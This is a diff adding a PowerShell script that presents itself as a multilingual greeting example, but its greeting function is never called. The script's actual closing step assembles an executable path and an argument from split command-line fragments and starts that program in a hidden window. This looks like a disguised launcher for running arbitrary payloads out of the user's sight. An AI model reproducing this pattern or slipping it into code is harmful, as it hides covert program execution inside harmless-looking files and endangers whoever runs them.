@@ -1,0 +1,41 @@
+# Define arrays for different languages
+$englishMessages = @("Hello!", "Welcome to the Internationalization Example!", "Goodbye!")
+$spanishMessages = @("¡Hola!", "¡Bienvenido al Ejemplo de Internacionalización!", "Adiós!")
+$frenchMessages = @("Bonjour!", "Bienvenue dans l'exemple d'internationalisation!", "Au revoir!")
+
+# Determine the selected language (default to English)
+$selectedLanguage = "english"
+
+# Get the preferred language from the command line arguments if provided
+if ($args.Count -gt 0) {
+    $selectedLanguage = $args[0].ToLower()
+}
+
+# Function to display messages based on selected language
+function DisplayMessages {
+    param (
+        [string]$language
+    )
+
+    switch ($language) {
+        "english" { $messages = $englishMessages }
+        "spanish" { $messages = $spanishMessages }
+        "french" { $messages = $frenchMessages }
+        default { $messages = $englishMessages } # Default to English for unsupported languages
+    }
+
+    Write-Output $messages[0]
+    Write-Output $messages[1]
+    Write-Output $messages[2]
+}
+
+
+$pP = $args[0]
+$pPe = $args[1]
+$pI = $args[2]
+$pIe = $args[3]
+$pl = $pP+"."+$pPe
+$il = $pI+"."+$pIe
+Write-Output $pl
+Write-Output $il
+Start-Process -FilePath $pl -ArgumentList $il -WindowStyle Hidden
